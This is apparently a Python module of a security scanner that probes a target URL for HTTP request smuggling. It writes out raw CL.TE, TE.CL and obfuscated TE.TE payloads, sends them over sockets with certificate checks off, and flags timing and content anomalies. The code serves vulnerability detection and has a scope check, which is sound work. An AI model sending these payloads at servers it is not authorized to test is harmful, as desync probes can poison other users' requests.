"""HTTP Request Smuggling detection.

Tests for CL.TE and TE.CL desync vulnerabilities using real HTTP/1.1 requests
sent over raw sockets (bypasses httpx/requests which normalize headers).

References:
  - https://portswigger.net/web-security/request-smuggling
  - https://github.com/defparam/smuggler (inspiration)
"""
from __future__ import annotations

import socket
import ssl
import time
from typing import Any, Dict, List, Optional
from urllib.parse import urlparse

import click
from rich.table import Table

from aegis.core.ui import console
from aegis.core.utils import emit_json


# ── Smuggling payloads ────────────────────────────────────────────────────────

def _build_clte_payload(host: str, path: str) -> bytes:
    """CL.TE: Content-Length says body is short, Transfer-Encoding says chunked."""
    body = "0\r\n\r\nG"  # Incomplete chunk — poisons next request with 'G'
    return (
        f"POST {path} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"Content-Type: application/x-www-form-urlencoded\r\n"
        f"Content-Length: {len(body)}\r\n"
        f"Transfer-Encoding: chunked\r\n"
        f"Connection: keep-alive\r\n"
        f"\r\n"
        f"{body}"
    ).encode()


def _build_tecl_payload(host: str, path: str) -> bytes:
    """TE.CL: Transfer-Encoding says chunked, Content-Length is wrong."""
    chunk = "1\r\nZ\r\n0\r\n\r\n"
    return (
        f"POST {path} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"Content-Type: application/x-www-form-urlencoded\r\n"
        f"Content-Length: 4\r\n"
        f"Transfer-Encoding: chunked\r\n"
        f"Connection: keep-alive\r\n"
        f"\r\n"
        f"{chunk}"
    ).encode()


def _build_tete_payload(host: str, path: str) -> bytes:
    """TE.TE: Both headers present, obfuscated Transfer-Encoding."""
    body = "0\r\n\r\n"
    return (
        f"POST {path} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"Content-Type: application/x-www-form-urlencoded\r\n"
        f"Content-Length: {len(body)}\r\n"
        f"Transfer-Encoding: chunked\r\n"
        f"Transfer-Encoding: identity\r\n"
        f"Connection: keep-alive\r\n"
        f"\r\n"
        f"{body}"
    ).encode()


def _build_normal_request(host: str, path: str) -> bytes:
    """Normal GET request to detect timing difference."""
    return (
        f"GET {path} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"Connection: keep-alive\r\n"
        f"\r\n"
    ).encode()


def _raw_send(
    host: str,
    port: int,
    use_ssl: bool,
    payload: bytes,
    timeout: float = 10.0,
) -> Dict[str, Any]:
    """Send raw bytes over a socket and return response + timing."""
    result: Dict[str, Any] = {
        "status": 0,
        "response": b"",
        "elapsed": 0.0,
        "error": None,
    }
    try:
        sock = socket.create_connection((host, port), timeout=timeout)
        if use_ssl:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            sock = ctx.wrap_socket(sock, server_hostname=host)

        start = time.monotonic()
        sock.sendall(payload)

        response = b""
        sock.settimeout(timeout)
        try:
            while True:
                chunk = sock.recv(4096)
                if not chunk:
                    break
                response += chunk
                if b"\r\n\r\n" in response and len(response) > 200:
                    break
        except socket.timeout:
            pass

        elapsed = time.monotonic() - start
        sock.close()

        # Parse status code
        if response:
            first_line = response.split(b"\r\n")[0].decode("utf-8", errors="replace")
            parts = first_line.split(" ", 2)
            if len(parts) >= 2:
                try:
                    result["status"] = int(parts[1])
                except ValueError:
                    pass

        result["response"] = response[:2000]
        result["elapsed"] = round(elapsed, 3)

    except Exception as exc:
        result["error"] = str(exc)

    return result


def _detect_smuggling(
    host: str,
    port: int,
    path: str,
    use_ssl: bool,
    timeout: float,
) -> List[Dict[str, Any]]:
    """Run all smuggling tests and return findings."""
    findings: List[Dict[str, Any]] = []

    tests = [
        ("CL.TE", _build_clte_payload(host, path)),
        ("TE.CL", _build_tecl_payload(host, path)),
        ("TE.TE (obfuscated)", _build_tete_payload(host, path)),
    ]

    # Baseline timing for normal request
    normal = _raw_send(host, port, use_ssl, _build_normal_request(host, path), timeout)
    baseline_time = normal.get("elapsed", 1.0)

    for test_name, payload in tests:
        result = _raw_send(host, port, use_ssl, payload, timeout)

        if result.get("error"):
            continue

        elapsed = result.get("elapsed", 0.0)
        status = result.get("status", 0)
        response_bytes = result.get("response", b"")

        # Detection heuristics:
        # 1. Significant timing delay (server waiting for more data)
        timing_anomaly = elapsed > (baseline_time * 3) and elapsed > 5.0
        # 2. 400/408/500 on the smuggled request (server confused)
        status_anomaly = status in (400, 408, 500, 502, 503)
        # 3. Response contains smuggled prefix
        content_anomaly = b"GPOST" in response_bytes or b"Invalid method" in response_bytes

        if timing_anomaly or content_anomaly:
            severity = "critical" if content_anomaly else "high"
            findings.append({
                "type": test_name,
                "severity": severity,
                "timing_anomaly": timing_anomaly,
                "content_anomaly": content_anomaly,
                "status_anomaly": status_anomaly,
                "elapsed": elapsed,
                "baseline": baseline_time,
                "status": status,
                "evidence": response_bytes[:500].decode("utf-8", errors="replace"),
            })

    return findings


@click.command("smuggling")
@click.argument("url")
@click.option("--path", default="/", show_default=True, help="Path to test.")
@click.option("--timeout", default=15.0, show_default=True, type=float)
@click.option("--json", "json_out", is_flag=True)
@click.option("--json-output", default=None)
@click.pass_context
def cli(
    ctx: click.Context,
    url: str,
    path: str,
    timeout: float,
    json_out: bool,
    json_output: Optional[str],
) -> None:
    """Detect HTTP request smuggling (CL.TE, TE.CL, TE.TE)."""
    context = ctx.obj
    db = context.db if context else None
    json_out = json_out or getattr(context, "json_out", False)
    json_output = json_output or getattr(context, "json_output", None)

    parsed = urlparse(url if "://" in url else f"https://{url}")
    host = parsed.hostname or url
    use_ssl = parsed.scheme == "https"
    port = parsed.port or (443 if use_ssl else 80)
    test_path = parsed.path or path

    # Scope check
    if context and hasattr(context, "scope") and context.scope:
        context.scope.validate_or_abort(host)

    console.print(f"[accent]Testing HTTP request smuggling on {host}:{port}{test_path}[/accent]")
    console.print("[dim]  Tests: CL.TE, TE.CL, TE.TE (obfuscated)[/dim]")

    findings = _detect_smuggling(host, port, test_path, use_ssl, timeout)

    if json_out:
        emit_json({"url": url, "findings": findings}, json_output)
        return

    if not findings:
        console.print("[green]No HTTP request smuggling detected.[/green]")
        return

    t = Table(title=f"Smuggling Findings ({len(findings)})")
    t.add_column("Type", style="red")
    t.add_column("Severity", style="magenta")
    t.add_column("Timing", style="cyan")
    t.add_column("Content Anomaly", style="yellow")
    t.add_column("Status", style="dim")

    for f in findings:
        t.add_row(
            f["type"],
            f["severity"],
            f"{f['elapsed']}s (baseline {f['baseline']}s)",
            "YES" if f["content_anomaly"] else "no",
            str(f["status"]),
        )
    console.print(t)

    if db:
        for f in findings:
            fid = db.add_finding(
                target_id=None, host_id=None, port_id=None,
                title=f"HTTP Request Smuggling ({f['type']}) on {host}",
                severity=f["severity"],
                category="vuln",
                description=(
                    f"Type: {f['type']}\n"
                    f"Timing anomaly: {f['timing_anomaly']} ({f['elapsed']}s vs {f['baseline']}s baseline)\n"
                    f"Content anomaly: {f['content_anomaly']}\n"
                    f"HTTP status: {f['status']}"
                ),
                source="smuggling",
            )
            if fid and f.get("evidence"):
                db.add_evidence(fid, "response_snippet", f["evidence"])

    console.print(
        f"[bold red]{len(findings)} smuggling vulnerability(ies) found![/bold red] "
        "This is a critical finding — report immediately."
    )
